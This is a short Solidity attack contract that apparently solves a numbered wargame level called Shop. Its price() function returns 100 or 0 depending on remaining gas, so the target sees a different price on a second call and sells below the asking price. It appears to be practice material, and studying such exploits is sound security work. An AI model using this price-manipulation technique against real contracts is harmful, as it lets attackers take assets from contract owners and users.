// SPDX-License-Identifier: MIT
pragma solidity 0.8.20;

import { Shop, Buyer } from "./Level21.sol";

contract L21Attack is Buyer {
    Shop instance;

    constructor(Shop _instance) {
        instance = _instance;
    }

    function attack() external {
        instance.buy();
    }

    function price() external view returns (uint256) {
        if (gasleft() < 10_000) {
            return 0;
        } else {
            return 100;
        }
    }
}
